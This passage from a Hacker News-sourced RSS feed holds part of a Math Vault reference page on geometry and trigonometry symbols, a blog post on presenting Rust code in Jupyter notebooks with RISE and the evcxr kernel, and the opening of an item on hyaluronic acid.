(opens in a new tab)" rel="noreferrer noopener">Arcminute</a></strong> symbol</td><td>$x’ = \left( \dfrac{x}{60}\right)^{\circ}$</td></tr><tr><td>$^{\prime\prime}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Minute_and_second_of_arc" target="_blank" aria-label="Arcsecond (opens in a new tab)" rel="noreferrer noopener">Arcsecond</a></strong> symbol</td><td>$38^{\prime\prime} = \left(\dfrac{38}{60}\right)’$</td></tr><tr><td>∟</td><td><strong><a aria-label="Right angle (opens in a new tab)" href="https://en.wikipedia.org/wiki/Right_angle" target="_blank" rel="noreferrer noopener">Right angle</a></strong> symbol</td><td><img src="https://mathvault.ca/wp-content/uploads/3-4-5-Right-Triangle.png" alt="A pink right triangle with length 3, 4 and 5" title="3 4 5 Right Triangle" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/3-4-5-Right-Triangle.png"></td></tr><tr><td>$-, =, \equiv$</td><td><strong>Equal angle/length</strong></td><td><img src="https://mathvault.ca/wp-content/uploads/45-45-90-Right-Triangle.png" alt="45-45-90-degree Right Triangle" title="45 45 90 Right Triangle" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/45-45-90-Right-Triangle.png"></td></tr></tbody></table></figure><div><figure><img src="https://mathvault.ca/wp-content/uploads/Key-Angles-in-Unit-Circle.png" alt="Key angles in unit circle in degree and radian" width="450" title="Key Angles in Unit Circle" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20450%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Key-Angles-in-Unit-Circle.png"><figcaption><strong>Key angles in degree and radian</strong></figcaption></figure></div><h2>Circle-related Symbols<span></span></h2><p>A <strong>circle</strong> can be thought of as a set of all points equidistant to a given point, and often plays a crucial role in the development of <a href="https://en.wikipedia.org/wiki/Euclidean_geometry" target="_blank" rel="noopener noreferrer">Euclidean geometry</a> and trigonometry. The following table documents some of the most notable symbols related to circle — along their respective meaning and example.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$O$</td><td>Variable for <strong><a aria-label="circles (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Circle" target="_blank">circle</a></strong><br>(or <strong><a href="https://en.wikipedia.org/wiki/Centre_(geometry)#Circles,_spheres,_and_segments" target="_blank" aria-label="center of circle (opens in a new tab)" rel="noreferrer noopener">center of circle</a></strong>)</td><td>If circles $O_1$ and $O_2$ share the same radius, then they are congruent.</td></tr><tr><td>$\odot P$</td><td><strong>Circle</strong> centered around point $P$</td><td>If $P \ne Q$, then $\odot P \ne \odot Q$.</td></tr><tr><td>$r$</td><td><strong><a aria-label="radius (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Radius" target="_blank">Radius</a></strong> of circle</td><td>$r = \sqrt{\dfrac{A}{\pi}}$</td></tr><tr><td>$d$</td><td><strong><a aria-label="diameter (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Diameter" target="_blank">Diameter</a></strong> of circle</td><td>$d =2r$</td></tr><tr><td>$C$</td><td><strong><a aria-label="circumference (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Circumference" target="_blank">Circumference</a></strong> of circle</td><td>$C=2\pi r$</td></tr><tr><td>$\overparen{AB}$</td><td><strong><a href="https://en.wikipedia.org/wiki/Arc_(geometry)" target="_blank" aria-label="Arc segment (opens in a new tab)" rel="noreferrer noopener">Arc segment</a></strong> between points $A$ and $B$</td><td>If $\overline{AB}$ is a diameter, then $\overparen{AB}$ would correspond to the half-circumference.</td></tr><tr><td>$\pi$</td><td><strong><a aria-label="Archimedes' constant (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Pi" target="_blank">Pi</a></strong><br>(Archimedes’ constant)</td><td>$\pi = \dfrac{C}{d} \approx 3.1416$</td></tr><tr><td>$\tau$</td><td><strong><a aria-label="Tau constant (opens in a new tab)" rel="noreferrer noopener" href="https://math.wikia.org/wiki/Tau_(constant)" target="_blank">Tau</a></strong><br>(constant representing the ratio between circumference and radius)</td><td>$\tau = 2 \pi \approx 6.2832$</td></tr><tr><td>$A$</td><td><strong><a href="https://en.wikipedia.org/wiki/Area_of_a_circle" target="_blank" aria-label="Area of circle (opens in a new tab)" rel="noreferrer noopener">Area of circle</a></strong></td><td>$A \propto r^2$</td></tr></tbody></table></figure><h2><span id="Trigonometric_Functions"></span>Trigonometric Functions<span></span></h2><p>In trigonometry, many functions are used to relate angles within a right triangle to its various <strong>lengths</strong> or <strong>ratios</strong>. The following table documents some of the most common functions in this category — along with their respective usage and example.</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$\sin \theta$</td><td><strong><a href="https://en.wikipedia.org/wiki/Sine" target="_blank" aria-label="Sine function (opens in a new tab)" rel="noreferrer noopener">Sine function</a></strong></td><td>$\sin\left(\dfrac{\pi}{2}\right) = 1$</td></tr><tr><td>$\mathrm{crd}\, \theta$</td><td><strong><a aria-label="Chord function (opens in a new tab)" href="https://en.wikipedia.org/wiki/Chord_(geometry)#In_trigonometry" target="_blank" rel="noreferrer noopener">Chord function</a></strong><br>(Length of chord subtended by angle $\theta$ in unit circle)</td><td>$\mathrm{crd}\, \theta \ge \sin \theta$</td></tr><tr><td>$\cos \theta$</td><td><strong><a href="https://mathworld.wolfram.com/Cosine.html" target="_blank" aria-label="Cosine function (opens in a new tab)" rel="noreferrer noopener">Cosine function</a></strong></td><td>$\sin^2 \theta + \cos^2 \theta =1$</td></tr><tr><td>$\tan \theta$</td><td><strong><a href="https://mathworld.wolfram.com/Tangent.html" target="_blank" aria-label="Tangent function (opens in a new tab)" rel="noreferrer noopener">Tangent function</a></strong></td><td>$\tan \theta = \dfrac{\sin \theta}{\cos \theta}$</td></tr><tr><td>$\csc \theta$</td><td><strong><a href="https://en.wikipedia.org/wiki/Trigonometric_functions#Right-angled_triangle_definitions" target="_blank" aria-label="Cosecant function (opens in a new tab)" rel="noreferrer noopener">Cosecant function</a></strong></td><td>$\csc \theta = \dfrac{1}{\sin \theta}$</td></tr><tr><td>$\sec \theta$</td><td><strong><a href="https://en.wikipedia.org/wiki/Trigonometric_functions#Right-angled_triangle_definitions" target="_blank" aria-label="Secant function (opens in a new tab)" rel="noreferrer noopener">Secant function</a></strong></td><td>$\sec^2 \theta = \tan^2 \theta + 1$</td></tr><tr><td>$\cot \theta$</td><td><strong><a href="https://en.wikipedia.org/wiki/Trigonometric_functions#Right-angled_triangle_definitions" target="_blank" aria-label="Cotangent function (opens in a new tab)" rel="noreferrer noopener">Cotangent function</a></strong></td><td>$\cot \theta = \dfrac{\cos \theta}{\sin \theta}$</td></tr><tr><td>$\arcsin x$, $\sin^{-1}x$</td><td><strong><a aria-label="Arcsine function (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Inverse_trigonometric_functions#Notation" target="_blank">Arcsine function</a></strong><br>(Inverse sine)</td><td>$-\dfrac{\pi}{2} \le \arcsin x \le \dfrac{\pi}{2}$</td></tr><tr><td>$\arccos x$, $\cos^{-1}x$</td><td><strong><a aria-label="Arccosine function (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Inverse_trigonometric_functions#Notation" target="_blank">Arccosine function</a></strong><br>(Inverse cosine)</td><td>$\arccos \left( \dfrac{\sqrt{2}}{2} \right) = \dfrac{\pi}{4}$</td></tr><tr><td>$\arctan x$, $\tan^{-1}x$</td><td><strong><a aria-label="Arctangent function (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Inverse_trigonometric_functions#Notation" target="_blank">Arctangent function</a></strong><br>(Inverse tangent)</td><td>$\displaystyle \lim_{x \to \infty} \arctan x = \dfrac{\pi}{2}$</td></tr></tbody></table></figure><figure><ul><li><figure><img src="https://mathvault.ca/wp-content/uploads/Sine-Graph.png" alt="Graph of sine function" data-id="27584" data-full-url="https://mathvault.ca/wp-content/uploads/Sine-Graph.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/sine-graph/" title="Sine Graph" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Sine-Graph.png"><figcaption><strong>Sine function</strong></figcaption></figure></li><li><figure><img src="https://mathvault.ca/wp-content/uploads/Cosine-Graph.png" alt="Graph of cosine function" data-id="27581" data-full-url="https://mathvault.ca/wp-content/uploads/Cosine-Graph.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/cosine-graph/" title="Cosine Graph" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Cosine-Graph.png"><figcaption><strong>Cosine function</strong></figcaption></figure></li><li><figure><img src="https://mathvault.ca/wp-content/uploads/Tangent-Graph.png" alt="Graph of tangent function" data-id="27585" data-full-url="https://mathvault.ca/wp-content/uploads/Tangent-Graph.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/tangent-graph/" title="Tangent Graph" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Tangent-Graph.png"><figcaption><strong>Tangent function</strong></figcaption></figure></li><li><figure><img src="https://mathvault.ca/wp-content/uploads/Cosecant-Graph.png" alt="Graph of cosecant function" data-id="27580" data-full-url="https://mathvault.ca/wp-content/uploads/Cosecant-Graph.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/cosecant-graph/" title="Cosecant Graph" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Cosecant-Graph.png"><figcaption><strong>Cosecant function</strong></figcaption></figure></li><li><figure><img src="https://mathvault.ca/wp-content/uploads/Secant-Graph.png" alt="Graph of secant function" data-id="27583" data-full-url="https://mathvault.ca/wp-content/uploads/Secant-Graph.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/secant-graph/" title="Secant Graph" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Secant-Graph.png"><figcaption><strong>Secant function</strong></figcaption></figure></li><li><figure><img src="https://mathvault.ca/wp-content/uploads/Cotangent-Graph.png" alt="Graph of cotangent function" data-id="27582" data-full-url="https://mathvault.ca/wp-content/uploads/Cotangent-Graph.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/cotangent-graph/" title="Cotangent Graph" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Cotangent-Graph.png"><figcaption><strong>Cotangent function</strong></figcaption></figure></li></ul></figure><h2>Other 2D/3D-figure-related Symbols<span></span></h2><p>In elementary geometry, much of the study revolves around the analysis of <a href="https://en.wikipedia.org/wiki/Polygon" target="_blank" rel="noopener noreferrer"><strong>polygons</strong></a>, <a href="https://en.wikipedia.org/wiki/Polyhedron" target="_blank" rel="noopener noreferrer"><strong>polyhedra</strong></a> and other <strong>3-dimensional figures</strong>. The following table documents some of the most notable symbols in these categories — along with each symbol’s respective meaning and usage.&nbsp;</p><figure><table><thead><tr><th>Symbol Name</th><th>Explanation</th><th>Example</th></tr></thead><tbody><tr><td>$\triangle ABC$</td><td><strong><a href="https://en.wikipedia.org/wiki/Triangle" target="_blank" aria-label="Triangle (opens in a new tab)" rel="noreferrer noopener">Triangle</a></strong> with vertices $A$, $B$ and $C$</td><td>$\triangle ABC \sim \triangle A’B’C’$</td></tr><tr><td>$\square ABCD$</td><td><strong><a href="https://en.wikipedia.org/wiki/Quadrilateral" target="_blank" aria-label="Quadrilaterals (opens in a new tab)" rel="noreferrer noopener">Quadrilaterals</a></strong> with vertices $A$, $B$, $C$ and $D$</td><td>If $\overline{AB} \parallel \overline{CD}$, then $\square ABCD$ is a <a href="https://en.wikipedia.org/wiki/Trapezoid" target="_blank" aria-label="trapezoid (opens in a new tab)" rel="noreferrer noopener">trapezoid</a>.</td></tr><tr><td>$\Pi$ (<a href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank" aria-label="Capital pi (opens in a new tab)" rel="noreferrer noopener">Capital pi</a>)</td><td>Variable for <strong><a href="https://en.wikipedia.org/wiki/Plane_(geometry)" target="_blank" aria-label="planes (opens in a new tab)" rel="noreferrer noopener">planes</a></strong></td><td>$\Pi_1 \parallel \Pi_2$</td></tr><tr><td>$F \sim F’$</td><td>Figure $F$ is <strong><a href="https://en.wikipedia.org/wiki/Similarity_(geometry)" target="_blank" aria-label="similar (opens in a new tab)" rel="noreferrer noopener">similar</a></strong> to figure $F’$</td><td>$\triangle ABC \sim \triangle PQR$</td></tr><tr><td>$F \nsim F’$</td><td>Figure $F$ is <strong>not similar</strong> to figure $F’$</td><td>Since $F$ is a <a href="https://en.wikipedia.org/wiki/Regular_polygon" target="_blank" aria-label="regular pentagon (opens in a new tab)" rel="noreferrer noopener">regular pentagon</a> and $F’$ is not, $F \nsim F’$.</td></tr><tr><td>$F \cong F’$</td><td>Figure $F$ is <strong><a href="https://en.wikipedia.org/wiki/Congruence_(geometry)" target="_blank" aria-label="congruent (opens in a new tab)" rel="noreferrer noopener">congruent</a></strong> to figure $F’$</td><td>$\triangle ABC \cong \triangle A’B’C’$<br>$\implies \overline{AB} \cong \overline{A’B’}$</td></tr><tr><td>$F \ncong F’$</td><td>Figure $F$ is <strong>not congruent</strong> to figure $F’$</td><td>$\square ABCD \nsim \\ \square A’B’C’D’ \implies \\ \square ABCD \ncong \\ \square A’B’C’D’ $</td></tr><tr><td>$\varphi$ (<a href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank" aria-label="phi (opens in a new tab)" rel="noreferrer noopener">phi</a>)</td><td><strong><a href="https://en.wikipedia.org/wiki/Golden_ratio" target="_blank" aria-label="Golden ratio (opens in a new tab)" rel="noreferrer noopener">Golden ratio</a></strong></td><td>$\varphi = \dfrac{1 + \sqrt{5}}{2} \approx 1.618$</td></tr><tr><td>$h$</td><td><strong><a aria-label="Height (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Height" target="_blank">Height</a></strong> of triangle/quadrilateral/<br>3D figures</td><td>Since $h = 5$, $A=\dfrac{5 \cdot 3}{2}$.</td></tr><tr><td>$b$</td><td><strong><a href="https://en.wikipedia.org/wiki/Base_(geometry)" target="_blank" aria-label="Base (opens in a new tab)" rel="noreferrer noopener">Base</a></strong> of triangle/quadrilateral</td><td>For an obtuse triangle, $b$ corresponds to the <em>extended base</em> of the triangle.</td></tr><tr><td>$l$</td><td><strong><a href="https://en.wikipedia.org/wiki/Length#Use_in_mathematics" target="_blank" aria-label="Length (opens in a new tab)" rel="noreferrer noopener">Length</a></strong> of rectangle/rectangular solid</td><td>When $l=10$, $A= 10 \cdot 20$.</td></tr><tr><td>$w$</td><td><strong><a href="https://en.wikipedia.org/wiki/Width_(disambiguation)" target="_blank" aria-label="Width (opens in a new tab)" rel="noreferrer noopener">Width</a></strong> of rectangle/rectangular solid</td><td>$A = lw$</td></tr><tr><td>$P$</td><td><strong><a href="https://en.wikipedia.org/wiki/Perimeter" target="_blank" aria-label="Perimeter (opens in a new tab)" rel="noreferrer noopener">Perimeter</a></strong> of planar figure</td><td>For a rectangle, $P = 2l + 2w$.</td></tr><tr><td>$A$</td><td><strong><a aria-label="Area (opens in a new tab)" href="https://en.wikipedia.org/wiki/Area" target="_blank" rel="noreferrer noopener">Area</a></strong> of planar figure<br>(or <a href="https://en.wikipedia.org/wiki/Surface_area" target="_blank" aria-label="surface area (opens in a new tab)" rel="noreferrer noopener">surface area</a> of 3D figure)</td><td>For a triangle, $A = \dfrac{bh}{2}$.</td></tr><tr><td>$V$</td><td><strong><a href="https://en.wikipedia.org/wiki/Volume" target="_blank" aria-label="Volume (opens in a new tab)" rel="noreferrer noopener">Volume</a></strong> of 3D figure</td><td>For a sphere, $V \propto r^3$.</td></tr><tr><td>$n$</td><td>Number of <strong><a href="https://en.wikipedia.org/wiki/Polygon" target="_blank" aria-label="sides (opens in a new tab)" rel="noreferrer noopener">sides</a></strong> in polygon</td><td>For an $n$-gon, the sum of interior angles equals $(n – 2) \cdot 180^{\circ}$.</td></tr><tr><td>$V$</td><td>Number of <strong><a href="https://en.wikipedia.org/wiki/Vertex_(geometry)#Of_a_polytope" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">vertices</a></strong> in polyhedron</td><td>For a cube, $V = 8$.</td></tr><tr><td>$E$</td><td>Number of <strong><a href="https://en.wikipedia.org/wiki/Edge_(geometry)" target="_blank" aria-label="edges (opens in a new tab)" rel="noreferrer noopener">edges</a></strong> in polyhedron</td><td>In general, $E \ge V$ for polyhedra.</td></tr><tr><td>$F$</td><td>Number of <strong><a href="https://en.wikipedia.org/wiki/Face_(geometry)" target="_blank" aria-label="faces (opens in a new tab)" rel="noreferrer noopener">faces</a></strong> in polyhedron</td><td>For a <a href="https://en.wikipedia.org/wiki/Tetrahedron" target="_blank" aria-label="tetrahedron (opens in a new tab)" rel="noreferrer noopener">tetrahedron</a>, $F=4$.</td></tr><tr><td>$\chi$ (<a href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/#Greek_Symbols" target="_blank" aria-label="chi (opens in a new tab)" rel="noreferrer noopener">chi</a>)</td><td><strong><a aria-label="Euler characteristic (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Euler_characteristic" target="_blank">Euler characteristic</a></strong></td><td>For <a href="https://en.wikipedia.org/wiki/Convex_polytope" target="_blank" aria-label="convex polyhedra (opens in a new tab)" rel="noreferrer noopener">convex polyhedra</a>, $\chi = V-E + F = \\ 2.$</td></tr></tbody></table></figure><p id="ps">The following figures illustrate the 5 <a href="https://en.wikipedia.org/wiki/Platonic_solid" target="_blank" rel="noopener noreferrer"><strong>platonic solids</strong></a> (regular, convex polyhedra), along with their respective number of vertices, edges and faces.</p><figure><ul><li><figure><img src="https://mathvault.ca/wp-content/uploads/Tetrahedron.png" alt="Colored tetrahedron" data-id="27666" data-full-url="https://mathvault.ca/wp-content/uploads/Tetrahedron.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/tetrahedron/" title="Tetrahedron" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Tetrahedron.png"><figcaption><strong>Tetrahedron</strong> $(V= 4, E= 6, \\ F=4, \chi=2)$</figcaption></figure></li><li><figure><img src="https://mathvault.ca/wp-content/uploads/Cube.png" alt="Colored cube" data-id="27662" data-full-url="https://mathvault.ca/wp-content/uploads/Cube.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/cube/" title="Cube" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Cube.png"><figcaption><strong>Cube</strong> $(V=8, E=12, \\ F=6, \chi=2)$</figcaption></figure></li><li><figure><img src="https://mathvault.ca/wp-content/uploads/Octahedron.png" alt="Colored octahedron" data-id="27665" data-full-url="https://mathvault.ca/wp-content/uploads/Octahedron.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/octahedron/" title="Octahedron" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Octahedron.png"><figcaption><strong>Octahedron</strong> $(V=6, E=12, \\ F=8, \chi=2)$</figcaption></figure></li><li><figure><img src="https://mathvault.ca/wp-content/uploads/Dodecahedron.png" alt="Colored dodecahedron" data-id="27663" data-full-url="https://mathvault.ca/wp-content/uploads/Dodecahedron.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/dodecahedron/" title="Dodecahedron" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Dodecahedron.png"><figcaption><strong>Dodecahedron</strong> $(V=20, E=30, F=12, \chi= 2)$</figcaption></figure></li><li><figure><img src="https://mathvault.ca/wp-content/uploads/Icosahedron.png" alt="Colored icosahedron" data-id="27664" data-full-url="https://mathvault.ca/wp-content/uploads/Icosahedron.png" data-link="https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/icosahedron/" title="Icosahedron" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Icosahedron.png"><figcaption><strong>Icosahedron</strong> $(V=12, E=30, F=20, \chi=2)$</figcaption></figure></li></ul></figure><p>For the master list of symbols, see <a href="https://mathvault.ca/hub/higher-math/math-symbols">mathematical symbols</a>. For lists of symbols categorized by <strong>type</strong> and <strong>subject</strong>, refer to the relevant pages below for more.</p><div><div><div><figure><img src="https://mathvault.ca/wp-content/uploads/Math-Symbols-eBook-Cover.png" alt="Cover of Math Vault's Comprehensive List of Mathematical Symbols eBook" title="Math Symbols eBook Cover" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Math-Symbols-eBook-Cover.png"></figure><div><p>Prefer the PDF version instead?</p><p>Get the master summary of mathematical symbols in <strong>eBook form</strong> — along with each symbol’s usage and LaTeX code.</p> </div></div></div></div><h2><span id="Additional_Resources"></span>Additional Resources<span></span></h2><ul><li><a href="https://mathvault.ca/higher-math-learning-guide"><strong>Definitive Guide to Learning Higher Mathematics</strong></a>: A standalone, 10-principle framework for tackling higher mathematical learning, thinking and problem solving efficiently</li><li><a href="https://mathvault.ca/latex"><strong>Ultimate LaTeX Reference Guide</strong></a>: Definitive reference guide to make the LaTeXing process more efficient and less painful</li><li><a href="https://mathvault.ca/10-commandments/"><strong>10 Commandments of Higher Mathematical Learning</strong></a>: An illustrated web guide on 10 scalable rules for learning higher mathematics</li><li><a href="https://mathvault.ca/math-glossary/"><strong>Definitive Glossary of Higher Math Jargon</strong></a>: A tour around higher mathematics in 106 terms</li></ul></div></div></div></section></div></div>]]>
            </description>
            <link>https://mathvault.ca/hub/higher-math/math-symbols/geometry-trigonometry-symbols/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734952</guid>
            <pubDate>Sat, 04 Jul 2020 21:13:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Giving Code Presentations]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23734730">thread link</a>) | @rolisz
<br/>
July 4, 2020 | https://rolisz.ro/2020/07/04/giving-code-presentations-in-jupyter-notebook/ | <a href="https://web.archive.org/web/*/https://rolisz.ro/2020/07/04/giving-code-presentations-in-jupyter-notebook/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

            

            <figure>
                <img srcset="https://rolisz.ro/content/images/size/w300/2020/07/rust.jpg 300w,
                            https://rolisz.ro/content/images/size/w600/2020/07/rust.jpg 600w,
                            https://rolisz.ro/content/images/size/w1000/2020/07/rust.jpg 1000w,
                            https://rolisz.ro/content/images/size/w2000/2020/07/rust.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://rolisz.ro/content/images/size/w2000/2020/07/rust.jpg" alt="Giving code presentations">
            </figure>

            <section>
                <div>
                    <p>I sometimes give talks at the <a href="https://oradeatechhub.ro/">local tech hub</a> in the city where I live. It's not a big community, but I enjoy giving talks and they often provide a necessary deadline and motivation to finish some projects. </p><p>Last week I gave a talk about Rust. Given that there are still some restrictions on how many people get be in one room, the physical audience was only 10 people, but there was a livestream as well. </p><p>Until now, I had used Google Slides for my presentation. For talks that don't have a lot of code, it works fine. But when you are presenting lots of code (such as a tutorial for a programming language), I found Slides to be lacking. If you paste in the code directly, you can't have syntax highlighting. You can paste in a screenshot, but then any later modifications to the slide mean retaking the screenshot and replacing it, so it's more work.</p><p>You can present in an IDE, but sometimes you want to have slides with normal text between pieces of code, where you explain some things. Switching between two apps can quickly get annoying. Also, it's hard to prepare just "bite-sized" content in an IDE, but that is needed so that the audience is focused only on what you are explaining right now. </p><p>So I decided to try something new for my intro to Rust presentation: I used Jupyter Notebook with a several extensions and I think it worked pretty well (except for a bug towards the end of the presentation). </p><p>For this I used the <a href="https://rise.readthedocs.io/en/stable/support.html">RISE extension</a>, which adds live slide show support to Jupyter, using <code>reveal.js</code>. Each cell can be either a new slide, a sub-slide (so to get to it you have to "navigate down", in reveal.js style), a fragment (so it shows up on the same slide, but on a subsequent click), or notes. You can write new code and run it even during slideshow mode, so it's very useful if someone in the audience has a question, you can quickly write down and execute code to answer them. RISE is simple to install:</p><pre><code>&gt; pip install RISE
</code></pre><p>Then I used a bunch of extenstions that are bundled together in the <code><a href="https://jupyter-contrib-nbextensions.readthedocs.io/en/latest/install.html">jupyter_contrib_nbextensions</a></code> package. By default, you have to enable and configure them by editing JSON files, but there is another plugin to add a dashboard for them, called <code><a href="https://github.com/Jupyter-contrib/jupyter_nbextensions_configurator">jupyter_nbextensions_configurator</a></code>. They can be installed with:</p><pre><code>&gt; pip install jupyter_contrib_nbextensions
&gt; jupyter contrib nbextension install --user
&gt; pip install jupyter_nbextensions_configurator
&gt; jupyter nbextensions_configurator enable --user</code></pre><p>You have to restart the Jupyter process and now you will see a new tab on the home page of the local Jupyter page, where you can enable and configure all the installed extensions. </p><figure><img src="https://rolisz.ro/content/images/2020/07/image.png"></figure><p>I used the "Hide input" extension. Most of my code was organized into two cells. One which didn't contain all the code, just a snippet on which I wanted to focus (for example, I made a small change to a previously defined function), and another one which could be run and showed output. The latter cell was hidden with this extension, so that only the output could be seen. </p><figure><div><div><p><img src="https://rolisz.ro/content/images/2020/07/hiddencell.png" width="3634" height="1657"></p><p><img src="https://rolisz.ro/content/images/2020/07/revealed_cell.png" width="2082" height="1657"></p></div></div><figcaption>Left: snippet cell and output of hidden cell in slide view. Right: snippet cell, revealed hidden cell and it's output in notebook view</figcaption></figure><p>Initially I also used the "Split cell" extension. This extension gives you a button which can make a cell to be half width. If two consecutive cells are half width, they align next to each other, making two columns. I wanted to use this to have code on the left column and explanations on the right column. This would have worked if the presentation was online only, because I wouldn't have had to zoom in too much. But because in the last week before the presentation we found out that it was allowed to hold the presentation in person (with 10 people in the audience) and I had to present on a projector and zoom in, I ended up removing all the split cells because the content wouldn't fit in any longer. </p><h2 id="making-rust-work-with-jupyter">Making Rust work with Jupyter</h2><p>All the above is generic and can be made to work with anything that works in Jupyter. To make Rust work in Jupyter you need a kernel for it. Some guys from Google have made one called <code><a href="https://github.com/google/evcxr/blob/master/evcxr_jupyter/README.md">evcxr_jupyter</a></code>. </p><p>It's fairly straightforward to install. On Windows you need to first install CMake and then you run:</p><pre><code>&gt; cargo install evcxr_jupyter
&gt; evcxr_jupyter --install</code></pre><p>After restarting the Jupyter process, you now have the option of using a Rust kernel. To include Cargo dependencies, you can insert the following into a cell:</p><pre><code>:dep reqwest = { version = "0.10", features = ["json", "blocking"] }</code></pre><p>This downloads <code>reqwest</code> , compiles it and makes it available for using in other cells. </p><p>The notebook for presentation that I gave can be found in <a href="https://github.com/rolisz/presentations/blob/master/Web%20crawler%20in%20Rust.ipynb">a Github repo</a> and the recording can be found <a href="https://www.youtube.com/watch?v=sLIFCsU_Z7E&amp;feature=youtu.be">here</a>. </p><p><em>I’m publishing this as part of <a href="https://100daystooffload.com/">100 Days To Offload</a> - Day 27.</em></p>
                </div>
            </section>

                <section>
    <h3>Subscribe to rolisz's site</h3>
	
</section>

            
            
            

        </article></div>]]>
            </description>
            <link>https://rolisz.ro/2020/07/04/giving-code-presentations-in-jupyter-notebook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23734730</guid>
            <pubDate>Sat, 04 Jul 2020 20:30:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hyaluronic acid does not hold a thousand times its weight in water]]>
            </title>
            <description>
<![CDATA[
Score 28 | Comments 12 (<a href="https://news.ycombinator.com/item?id=23734705">thread link</a>) | @apsec112
<br/>
